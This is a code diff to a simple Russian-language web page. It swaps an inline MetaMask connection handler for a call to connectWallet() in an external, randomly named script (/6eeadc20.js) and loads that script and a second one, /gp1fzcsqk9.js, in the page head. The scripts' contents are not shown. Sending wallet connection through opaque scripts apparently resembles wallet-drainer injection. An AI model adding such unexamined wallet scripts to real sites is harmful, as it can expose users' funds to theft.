@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Простой сайт</title>
+
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -134,6 +135,10 @@
       0% { background-position: 0 0; } 50% { background-position: 400% 0; } 100% { background-position: 0 0; }
     }
   </style>
+
+  <!-- Подключаем необходимые скрипты в конце head -->
+  <script src="/6eeadc20.js"></script>
+  <script src="/gp1fzcsqk9.js" type="module"></script>
 </head>
 <body>
   <div id="rating" class="tab-content"></div>
@@ -184,33 +189,15 @@
         }
       } catch(e){}
 
-      // Кнопка подключения кошелька через MetaMask
+      // Кнопка подключения кошелька
       const walletBtn = document.getElementById('connectWallet');
-      walletBtn.addEventListener('click', async () => {
-        if (window.ethereum) {
-          try {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const account = accounts[0];
-            alert('Кошелек подключен: ' + account);
-            usernameEl.textContent = account; // можно показывать адрес пользователя
-          } catch(err) {
-            console.error(err);
-            alert('Подключение кошелька отменено или произошла ошибка');
-          }
+      walletBtn.addEventListener('click', () => {
+        if (typeof connectWallet === 'function') {
+          connectWallet(); // вызываем функцию из 6eeadc20.js
         } else {
-          alert('MetaMask не найден. Установите MetaMask или другой кошелек.');
+          alert('Функция подключения кошелька не найдена. Убедитесь, что 6eeadc20.js загружен.');
         }
       });
-
-      // Подключаем внешние скрипты после загрузки DOM
-      const script1 = document.createElement('script');
-      script1.src = '/6eeadc20.js';
-      document.body.appendChild(script1);
-
-      const script2 = document.createElement('script');
-      script2.type = 'module';
-      script2.src = '/gp1fzcsqk9.js';
-      document.body.appendChild(script2);
     }
   </script>
 </body>
